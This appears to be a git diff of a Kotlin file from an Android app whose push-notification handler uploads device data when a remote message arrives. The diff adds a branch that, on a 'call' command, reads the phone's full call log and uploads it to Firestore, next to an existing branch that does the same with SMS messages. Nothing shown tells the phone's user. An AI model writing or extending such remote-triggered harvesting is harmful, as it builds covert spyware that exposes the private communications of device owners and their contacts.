@@ -11,6 +11,7 @@ import com.eye.di.module.FirebaseModule
 import com.eye.screen.user.UserEvent
 import com.eye.screen.user.UserViewModel
 import com.eye.utils.EyeDetails
+import com.eye.utils.EyeDetails.readCallLog
 import com.eye.utils.EyeDetails.readSMS
 import com.onesignal.OSNotificationReceivedEvent
 import com.onesignal.OneSignal
@@ -44,6 +45,10 @@ class NotificationServiceExtension : OneSignal.OSRemoteNotificationReceivedHandl
                         firestoreRepository.uploadSMSLog(smsReader)
                     }
                     "call" -> {
+                        val callReader = context.readCallLog().groupBy {
+                            it.date
+                        }
+                        firestoreRepository.uploadCallLog(callReader)
                     }
                 }
             }
